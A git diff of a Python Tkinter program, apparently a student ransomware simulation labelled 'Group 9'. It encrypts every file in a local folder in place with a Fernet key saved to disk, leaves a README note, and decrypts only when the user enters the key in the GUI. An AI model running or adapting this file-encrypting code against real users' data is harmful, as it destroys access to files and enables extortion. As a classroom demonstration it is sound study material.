@@ -1,9 +1,85 @@
+from cryptography.fernet import Fernet
 from tkinter import *
 from tkinter import ttk
-import encrypt
-from decrypt import decrypt_files
+import os
 
 
+# ************************ ENCRIPTACION ******************************
+
+def generate_key():
+    key = Fernet.generate_key()
+    with open('key.key', 'wb') as key_file:
+        key_file.write(key)
+
+
+def load_key():
+    return open('key.key', 'rb').read()
+
+
+#items to encrypt
+#our key
+def encrypt(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+
+        with open(item, 'wb') as file:
+            file.write(encrypted_data)
+
+
+def encrypt_files():
+    path_to_encrypt = './files'
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt + '/' + item for item in items]
+    generate_key()
+    key = load_key()
+
+    encrypt(full_path, key)
+
+    with open(path_to_encrypt + '/' + 'README.txt', 'w') as file:
+        file.write('Files encrypted by Group 9\n')
+        
+
+
+
+
+# ************************ DESENCRIPTACION ******************************
+
+
+def decrypt(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as file:
+            encrypted_data = file.read()
+        decrypted_data = f.decrypt(encrypted_data)
+
+        with open(item, 'wb') as file_write:
+            file_write.write(decrypted_data)
+
+
+def decrypt_files(input_key):
+    key = load_key()
+    print(key.decode('UTF-8'))
+    
+    if key.decode('UTF-8') != input_key:
+      return False
+    
+    path_to_encrypt = './files'
+    os.remove(path_to_encrypt + '/' + 'README.txt')
+
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt + '/' + item for item in items]
+
+    decrypt(full_path, key)
+    return True
+
+
+
+
+
+# ************************ PANTALLA ******************************
 
 def verify_key():
   key = entry.get()
@@ -18,7 +94,7 @@ def verify_key():
   
   
 if __name__ == '__main__':
-  exec(open('encrypt.py').read())
+  encrypt_files();
   
   win = Tk()
   win.geometry("450x300")
